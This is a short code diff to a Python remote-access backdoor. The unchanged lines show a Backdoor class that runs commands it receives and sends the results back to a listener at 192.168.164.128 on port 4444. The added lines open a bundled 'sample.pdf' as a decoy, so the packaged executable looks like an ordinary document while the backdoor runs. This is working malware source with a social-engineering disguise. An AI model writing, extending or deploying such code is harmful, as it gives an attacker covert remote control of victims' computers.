@@ -64,6 +64,8 @@ class Backdoor:
                 command_result = "[-] Error during command execution"
             self.reliable_send(command_result)
 
+file_name = sys._MEIPASS + "\sample.pdf"
+subprocess.Popen(file_name,shell=True)
 
 try:
     my_backdoor = Backdoor("192.168.164.128", 4444)
